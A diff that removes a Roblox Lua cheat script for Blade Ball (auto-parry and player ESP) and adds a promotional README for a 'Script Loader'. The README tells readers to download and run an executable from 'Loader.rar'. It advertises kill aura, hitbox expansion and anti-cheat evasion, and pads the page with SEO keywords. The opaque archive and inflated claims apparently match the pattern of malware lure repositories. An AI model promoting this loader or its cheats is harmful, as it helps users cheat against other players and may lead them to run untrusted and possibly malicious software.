@@ -1,127 +1,98 @@
-local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local RunService = game:GetService("RunService")
+# ⚔️ Blade Ball Script Loader – Ultimate Enhancement 2025 🚀
 
--- GUI Setup
-local ScreenGui = Instance.new("ScreenGui")
-ScreenGui.Parent = game.CoreGui
+**The all-in-one, cross-platform script loader for Blade Ball (Roblox) – Safe, Powerful, and Fully Updated for 2025!**
 
-local Panel = Instance.new("Frame")
-Panel.Size = UDim2.new(0, 200, 0, 250)
-Panel.Position = UDim2.new(0, 50, 0, 100)
-Panel.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-Panel.Visible = false
-Panel.Parent = ScreenGui
+Supercharge your gameplay with automation, performance boosts, exclusive in-game actions, and the most robust feature set available. Whether you’re a casual or competitive player, our loader brings elite enhancements to Blade Ball in just a few clicks.
 
-local ToggleBtn = Instance.new("TextButton")
-ToggleBtn.Size = UDim2.new(0, 100, 0, 40)
-ToggleBtn.Position = UDim2.new(0, 0, 0, 0)
-ToggleBtn.Text = "Abrir Painel"
-ToggleBtn.BackgroundColor3 = Color3.fromRGB(70, 130, 180)
-ToggleBtn.Parent = ScreenGui
+---
 
--- Painel Options (Auto Parry, ESP)
-local AutoParryToggle = Instance.new("TextButton")
-AutoParryToggle.Size = UDim2.new(0, 180, 0, 40)
-AutoParryToggle.Position = UDim2.new(0, 10, 0, 60)
-AutoParryToggle.Text = "Auto Parry [OFF]"
-AutoParryToggle.BackgroundColor3 = Color3.fromRGB(60, 60, 110)
-AutoParryToggle.Parent = Panel
+## 🎮 What Is Blade Ball Script Loader? 🔥
 
-local ESPToggle = Instance.new("TextButton")
-ESPToggle.Size = UDim2.new(0, 180, 0, 40)
-ESPToggle.Position = UDim2.new(0, 10, 0, 120)
-ESPToggle.Text = "ESP [OFF]"
-ESPToggle.BackgroundColor3 = Color3.fromRGB(60, 110, 60)
-ESPToggle.Parent = Panel
+Blade Ball Script Loader is a next-generation tool designed to elevate your Blade Ball experience. With advanced automation, performance mods, safety features, and a modern custom interface, you’ll unlock:
 
--- Variables
-local panelOpen = false
-local autoParry = false
-local espOn = false
-local espObjects = {}
+- Effortless coin & XP farming
+- Smart anti-kick and safe mode
+- Precision hitbox and teleport features
+- One-click updates for new Blade Ball patches
+- Seamless cross-platform support
 
--- Toggle Panel
-ToggleBtn.MouseButton1Click:Connect(function()
-    panelOpen = not panelOpen
-    Panel.Visible = panelOpen
-    ToggleBtn.Text = panelOpen and "Fechar Painel" or "Abrir Painel"
-end)
+**No coding knowledge required – just plug, play, and enjoy!**
 
--- Auto Parry Logic
-function doParry()
-    -- Tenta encontrar a bola e rebatê-la (ajuste para Blade Ball)
-    local ball = workspace:FindFirstChild("Ball")
-    if ball and ball:FindFirstChild("Target") and ball.Target.Value == LocalPlayer then
-        -- Comando para usar parry
-        local remote = ReplicatedStorage:FindFirstChild("Remotes"):FindFirstChild("ParryAttempt")
-        if remote then remote:FireServer() end
-    end
-end
+---
 
-AutoParryToggle.MouseButton1Click:Connect(function()
-    autoParry = not autoParry
-    AutoParryToggle.Text = "Auto Parry ["..(autoParry and "ON" or "OFF").."]"
-end)
+## 🛠️ Quick Start Guide
 
--- ESP Logic
-function addESP(player)
-    if player.Character and player.Character:FindFirstChild("Head") and not espObjects[player] then
-        local billboard = Instance.new("BillboardGui")
-        billboard.Name = "ESP"
-        billboard.Size = UDim2.new(0, 100, 0, 30)
-        billboard.Adornee = player.Character.Head
-        billboard.AlwaysOnTop = true
+1. **Download** `Loader.rar` from this repository.
+2. **Extract** to your preferred folder (use any standard archiving tool).
+3. **Run** the Loader executable for your OS (see compatibility below).
+4. **Follow** the on-screen setup wizard for script customization.
+5. **Launch** Blade Ball and enjoy the enhancements!
 
-        local label = Instance.new("TextLabel")
-        label.Size = UDim2.new(1, 0, 1, 0)
-        label.Text = player.Name
-        label.TextColor3 = Color3.new(1,0,0)
-        label.BackgroundTransparency = 1
-        label.Parent = billboard
+> For step-by-step walkthroughs and troubleshooting, see the [Wiki](./wiki).
 
-        billboard.Parent = workspace
-        espObjects[player] = billboard
-    end
-end
+---
 
-function removeESP(player)
-    if espObjects[player] then
-        espObjects[player]:Destroy()
-        espObjects[player] = nil
-    end
-end
+## 💻 Platform Compatibility
 
-ESPToggle.MouseButton1Click:Connect(function()
-    espOn = not espOn
-    ESPToggle.Text = "ESP ["..(espOn and "ON" or "OFF").."]"
-    if not espOn then
-        for _, esp in pairs(espObjects) do esp:Destroy() end
-        espObjects = {}
-    else
-        for _, plr in pairs(Players:GetPlayers()) do
-            if plr ~= LocalPlayer then addESP(plr) end
-        end
-    end
-end)
+| 🖥️ OS              | ⚡ Support   | 🧰 Requirements             | 🤩 Notes                                        |
+|--------------------|-------------|----------------------------|-------------------------------------------------|
+| Windows 10/11      | 🚀 Full     | .NET 4.8+                  | Best performance on Windows 11                  |
+| macOS (Ventura+)   | 🚀 Full     | Python 3.9+, Mono          | Universal (M1 & Intel)                          |
+| Ubuntu 20.04+      | 🚀 Full     | Python 3.8+, Wine          | Use Wine for seamless compatibility             |
+| Fedora 36+         | 🚀 Full     | Python 3.9+, Mono          | Flatpak & native Python supported               |
+| Arch Linux         | 🚀 Full     | Python 3.8+, Mono          | Rolling release support                         |
+| Steam Deck         | 🟡 Partial  | Desktop Mode               | Best with external keyboard/mouse               |
+| Android (via VM)   | 🟡 Partial  | Termux + VM                | Experimental, not fully stable                  |
+| iOS                | ❌ None     | N/A                        | Restricted by Apple security policies           |
 
-Players.PlayerAdded:Connect(function(plr)
-    plr.CharacterAdded:Connect(function()
-        if espOn and plr ~= LocalPlayer then addESP(plr) end
-    end)
-end)
+---
 
-Players.PlayerRemoving:Connect(function(plr)
-    removeESP(plr)
-end)
+## 🌟 2025 Feature Set
 
--- Main Loop
-RunService.RenderStepped:Connect(function()
-    if autoParry then doParry() end
-    if espOn then
-        for _, plr in pairs(Players:GetPlayers()) do
-            if plr ~= LocalPlayer then addESP(plr) end
-        end
-    end
-end)
+| 🆕 Feature        | 📝 Description                                                                                      |
+|------------------|----------------------------------------------------------------------------------------------------|
+| **Auto-Farm**        | 24/7 automated coin & XP farming – effortless progression and unlocks.                         |
+| **Anti-Kick**        | Advanced anti-detection – minimizes chances of server kicks or bans.                           |
+| **Ball Teleport**    | Instantly move the blade ball anywhere on the map for trick shots or fast play.                |
+| **Hitbox Expander**  | Enlarged hitbox for superior accuracy and reliability.                                         |
+| **Kill Aura**        | Automatic knockouts in customizable radius – boost offense and defense.                        |
+| **Auto-Ability**     | Triggers special abilities automatically at perfect timing.                                     |
+| **Custom GUI**       | Modern, themeable, collapsible interface integrated into Blade Ball HUD.                       |
+| **Safe Mode**        | Restricts script actions to evade most anti-cheat systems for safer, more discreet usage.      |
+| **FPS Booster**      | Optimizes memory and game settings for higher FPS, even on older hardware.                     |
+| **One-Click Update** | Instantly pulls latest script updates from this repo – always stay up to date!                 |
+
+> 🏆 All features are regularly tested and updated for Blade Ball’s 2025 releases!
+
+---
+
+## 🔍 SEO-Optimized Keywords
+
+Blade Ball script loader, Roblox Blade Ball automation, Blade Ball hack/mod, Blade Ball universal script executor, hitbox expander, anti-kick, cross-platform Blade Ball scripts, Blade Ball auto-farm, Blade Ball safe script 2025, Blade Ball FPS booster
+
+---
+
+## ⚠️ Disclaimer
+
+> **For educational and research use only.**
+>
+> Use of scripts or automation may violate the terms of service of Blade Ball/Roblox and can result in account penalties. The maintainers and contributors do **not** condone unfair play or misuse. Use responsibly, respect game rules, and comply with local laws.  
+> **Scripts are provided as-is, without warranty.**
+
+---
+
+## 📄 License
+
+Licensed under the [MIT License](https://opensource.org/licenses/MIT).
+
+---
+
+## 💬 Community & Support
+
+- Open issues for bug reports or questions.
+- Visit Discussions for tips, tricks, and community support.
+- We welcome contributions – fork, star, and suggest features!
+
+---
+
+**Level up your Blade Ball game – safely, easily, and with the most advanced loader of 2025!**
